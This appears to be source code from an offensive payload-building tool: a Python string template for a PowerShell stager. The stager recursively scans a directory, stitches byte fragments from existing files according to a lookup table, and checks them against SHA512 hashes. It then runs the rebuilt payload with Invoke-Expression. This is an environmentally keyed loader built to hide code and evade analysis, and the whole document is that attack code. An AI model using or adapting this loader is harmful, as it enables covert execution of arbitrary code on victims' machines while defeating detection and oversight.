buildcode="""
function Get-DecryptedString($key, $encryptedStringWithIV) {{
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    #$bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Get-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}}

function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
    $sha512 = new-Object System.Security.Cryptography.SHA512Managed
    $end = $payload.Length - $minus_bytes -1
    $compHash = $sha512.ComputeHash($payload)
    $temp_stuff =  [System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "")
    write-host $temp_stuff
    write-host $payload_hash
    if ([System.BitConverter]::ToString($sha512.ComputeHash($payload[0..$end])).ToLower().Replace("-", "").Equals($payload_hash)) {{
        return 1
    }} Else {{
        return 0
    }}
}}

function Get-CodeExecution($payload, $some_file){{
    
    $read_file = [System.IO.File]::ReadAllBytes($some_file)
    $lookup_table = [System.Convert]::FromBase64String("{3}")
    $tLoc = 0
    $tsize = 0
    $itr = 0
    $decrypted_loader = @()
    
    while($itr -lt $lookup_table.Length){{
        $rLoc =  ([Byte[]] $lookup_table[$itr..($itr+2)]) + [Byte[]] 0x00
        $rSz =   ([Byte[]] $lookup_table[($itr+3)]) + [Byte[]] 0x00
        $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
        $tsize = [bitconverter]::ToUInt16($rSz, 0)
        $decrypted_loader += [Byte[]] $read_file[$tLoc..($tLoc+$tsize-1)]
        $tLoc = 0
        $tsize = 0
        $itr+= 4
    }}
    [System.Text.Encoding]::ASCII.GetString($payload).Trim([char]0) | iex

}}

function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternumhash, $minus_bytes, $scan_dir){{
    
    Write-Host "[*] Hash Iterations: " + $iteration_temp
        
    # open file
    Write-Host "[*] File: " + $some_file
    try {{
        $read_file = [System.IO.File]::ReadAllBytes($some_file)
        $tLoc = 0
        $tsize = 0
        $tmpstitchCheck = @()
        $itr = 0

        #WTF powershell inclusive arrays too
        while($itr -lt $small_table.Length){{
            $tmp1 = $itr+2
            $tmp2 = $itr+3
            Write-Host "[*] Table Length: " + $small_table.Length
            Write-Host "[*] Iterator: " + $itr
            Write-Host "[*] Raw Location: " + ([Byte[]] $small_table[$itr..$tmp1]) + [Byte[]] 0x00
            Write-Host "[*] Raw Size: " + ([Byte[]] $small_table[$tmp2]) + [Byte[]] 0x00
            $rLoc =  ([Byte[]] $small_table[$itr..$tmp1]) + [Byte[]] 0x00
            $rSz =   ([Byte[]] $small_table[$tmp2]) + [Byte[]] 0x00
            $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
            $tsize = [bitconverter]::ToUInt16($rSz, 0)
            Write-Host "[*] Converted Location: " + $tLoc
            Write-Host "[*] Converted Size: " + $tsize
            $tmpstitchCheck += [Byte[]] $read_file[$tLoc..($tLoc+$tsize-1)]
            $tLoc = 0
            $tsize = 0
            $itr+= 4
        }}
        #have to get rid of the first value inserted to create the byte array holder
        $stitchCheck = $tmpstitchCheck
        $stitchCheck.GetType()
        Write-Host "Length of the Rebuilt Data: ", $stitchCheck.Length
        #$keyvalue = $read_file[$location..($location + $key_len - 1)]
        #$sha512 = new-Object System.Security.Cryptography.SHA512Managed
        
    }} Catch {{
        return 0
    }}
    
    #no minus bytes for the small check
    $result = Get-CheckHash $stitchCheck $iternumhash 0

   ##################################################################
   #shoul have iterative function here, but not today
    if ($result -eq 1){{
        Write-Host "[*] Short Hashes Match!"
        Write-Host "[*] Starting Full Hash Match Verification"
            
        # open file
        Write-Host "[*] File: ", $some_file
        try {{
            $read_file = [System.IO.File]::ReadAllBytes($some_file)
            $tLoc = 0
            $tsize = 0
            $tmpstitchCheck = @()
            $itr = 0

            #WTF powershell inclusive arrays too
            while($itr -lt $full_table.Length){{
                $tmp1 = $itr+2
                $tmp2 = $itr+3
                Write-Host "[**] Table Length: " + $small_table.Length
                Write-Host "[**] Iterator: " + $itr
                Write-Host "[**] Raw Location: " + ([Byte[]] $full_table[$itr..$tmp1]) + [Byte[]] 0x00
                Write-Host "[**] Raw Size: " + ([Byte[]] $full_table[$tmp2]) + [Byte[]] 0x00
                $rLoc =  ([Byte[]] $full_table[$itr..$tmp1]) + [Byte[]] 0x00
                $rSz =   ([Byte[]] $full_table[$tmp2]) + [Byte[]] 0x00
                $tLoc = [bitconverter]::ToUInt32($rLoc, 0) 
                $tsize = [bitconverter]::ToUInt16($rSz, 0)
                Write-Host "[**] Converted Location: " + $tLoc
                Write-Host "[**] Converted Size: " + $tsize
                $tmpstitchCheck += [Byte[]] $read_file[$tLoc..($tLoc+$tsize-1)]
                $tLoc = 0
                $tsize = 0
                $itr+= 4
        }}
        #have to get rid of the first value inserted to create the byte array holder
        $stitchCheck = $tmpstitchCheck
        Write-Host "[*] Length of the Rebuilt Data: ", $stitchCheck.Length
        
    }} Catch {{
        return 0
    }}
    
    #minus bytes required for the full check
    $result = Get-CheckHash $stitchCheck $payload_hash $minus_bytes
        
       if ($result -eq 1){{
        Write-Host "[*] Final Hashes Match"
        Get-CodeExecution $stitchCheck $some_file
        return 1

        }}
    }}   
}}

function Get-Walk-OS($small_table,$full_table,$payload_hash,$iternumhash,$minus_bytes,$scan_dir){{
    $dir_parsing = get-childitem $scan_dir -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
    [Environment]::Is64BitProcess
    #Select-String -Pattern sysnative
    $sys_paths = @( "c:\", "c:\windows", "c:\windows\system32")
    
    if ([Environment]::Is64BitProcess -eq 0 -And $sys_paths -contains $scan_dir) {{ # Is a 32bit process
        $dir_parsing += get-childitem "\Windows\sysnative" -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
    }} 

    foreach ($some_file in $dir_parsing){{
        if ((Get-Item $some_file) -isnot [System.IO.DirectoryInfo] ){{
            Get-Item $some_file
            if ( (Get-R-Done $some_file $small_table $full_table $payload_hash $iternumhash $minus_bytes $scan_dir) -eq 1) {{
                break
            }}
        }}
    }}
}}


	$lookup_table = [System.Convert]::FromBase64String("{0}")
	$payload_hash = "{1}"
	$iternumhash = "{2}"
    $minus_bytes = {4}
	$scan_dir = "{5}"

    Write-Host "Raw Table " + $lookup_table[0..20]
    $size_init_table = [bitconverter]::ToUInt32($lookup_table[0..3], 0)
    $size_full_table = $lookup_table.Length

    Write-Host "Init (small) Table Size: " + $size_init_table

    $small_table = $lookup_table[4..(($size_init_table*4)+3)]
    $full_table = $lookup_table[4..($size_full_table-1)]
 
    #Write-Host "Small Table: " , $small_table[0..20]
    if ($scan_dir.Contains("%")){{
        $scan_dir = [Environment]::GetEnvironmentVariable($scan_dir -replace "%")
    }}

    Get-Walk-OS $small_table $full_table $payload_hash $iternumhash $minus_bytes $scan_dir 
"""